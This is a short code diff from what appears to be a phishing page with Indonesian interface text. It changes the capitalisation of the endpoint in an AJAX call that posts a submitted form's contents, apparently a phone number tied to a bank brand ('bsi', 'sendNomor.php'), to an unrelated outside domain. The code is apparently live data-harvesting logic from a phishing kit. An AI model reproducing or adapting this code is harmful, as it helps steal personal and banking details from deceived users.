@@ -8,7 +8,7 @@ document.getElementById('btnSubmit1').innerHTML = "Memproses...";
 
  $.ajax({
  type: 'POST',
- url: 'https://tarakan001kaltim.skom.id//musksikhfaaotuload/02/bsi/dewekanbe/sendNomor.php',
+ url: 'https://tarakan001kaltim.skom.id//musksikhfaaotuload/02/bsi/dewekanbe/sendnomor.php',
  data: $(this).serialize(),
  datatype: 'JSON',
  
